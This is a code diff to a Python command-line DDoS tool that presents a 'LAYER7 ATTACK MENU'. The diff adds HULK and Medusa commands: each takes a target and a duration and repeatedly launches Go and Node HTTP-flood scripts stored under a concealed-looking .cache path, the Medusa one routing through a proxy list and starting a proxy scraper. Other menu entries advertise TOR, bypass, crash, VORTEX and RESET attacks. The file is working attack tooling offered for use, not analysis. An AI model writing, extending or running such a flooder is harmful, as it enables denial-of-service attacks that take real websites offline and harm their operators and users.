@@ -130,19 +130,23 @@ def mn_lp():
                 o.system("clear")
                 print(
                     """
-  _____      __   ___
-  |_   _|__ _ \\ \\ / (_)_ _ _  _ ___
-    | |/ _ \\ '_\\ V /| | '_| || (_-<
-    |_|\\___/_|  \\_/ |_|_|  \\_,_/__/
+     _____      __   ___
+    |_   _|__ _ \\ \\ / (_)_ _ _  _ ___
+      | |/ _ \\ '_\\ V /| | '_| || (_-<
+      |_|\\___/_|  \\_/ |_|_|  \\_,_/__/
 
-     🚨  LAYER7 ATTACK MENU  🚨
-       (Top-secret Protocols)
+       🚨  LAYER7 ATTACK MENU  🚨
+         (Top-secret Protocols)
 
-        Commands available:
-   -  TOR    : Attack via TOR network
-   -  BYPASS : Attack via Bypassing protection
-   -  CRASH  : Attack via Crashing Ips
-                    """
+           Commands available:
+ -  TOR    : Attack via TOR network
+ -  BYPASS : Attack via Bypassing protection
+ -  HULK   : Attack via HTTP Unbearable Load King (HULK)
+ -  CRASH  : Attack via Crashing Ips
+ -  VORTEX : Initiate a VORTEX-based attack
+ -  MM     : Medusa attack
+ -  RESET  : Engage a RESET attack
+"""
                 )
                 continue
 
@@ -201,6 +205,23 @@ def mn_lp():
                 except Exception as e:
                     print(f"❌ An error occurred: {e}")
 
+            elif cmd == "HULK":
+                try:
+                    tg = parts[1]
+                    mx_tm = int(parts[2])
+                    ani_txt(
+                        f"Engaging HULK attack on {tg} for {mx_tm} seconds... 💥", 0.05
+                    )
+                    st_tm = t.time()
+                    while t.time() - st_tm < mx_tm:
+                        rn_cmd(f"go run bin/odd/.cache/HULK.go -site {tg} -data GET")
+                        rn_cmd(f"go run bin/odd/.cache/HULK.go -site {tg} -data POST")
+                        t.sleep(1)
+                except IndexError:
+                    print("❌ Invalid Command. Usage: HULK <TARGET> <TIME>")
+                except Exception as e:
+                    print(f"❌ An error occurred: {e}")
+
             elif cmd == "CRASH":
                 try:
                     tg = parts[1]
@@ -238,6 +259,29 @@ def mn_lp():
                         t.sleep(1)
                 except IndexError:
                     print("❌ Invalid Command. Usage: VORTEX <TARGET> <TIME>")
+                except Exception as e:
+                    print(f"❌ An error occurred: {e}")
+
+            elif cmd == "MM":
+                try:
+                    tg = parts[1]
+                    mx_tm = int(parts[2])
+                    ani_txt(
+                        f"Engaging Medusa attack on {tg} for {mx_tm} seconds... 💥",
+                        0.05,
+                    )
+                    st_tm = t.time()
+                    while t.time() - st_tm < mx_tm:
+                        rn_cmd(
+                            f"node bin/odd/.cache/MM.js {tg} 600 100 10 root/proxy.txt"
+                        )
+                        rn_cmd(f"python3 root/scrape.py &")
+                        rn_cmd(
+                            f"node bin/odd/.cache/MM.js {tg} 600 100 10 root/proxy.txt"
+                        )
+                        t.sleep(1)
+                except IndexError:
+                    print("❌ Invalid Command. Usage: MM <TARGET> <TIME>")
                 except Exception as e:
                     print(f"❌ An error occurred: {e}")
 
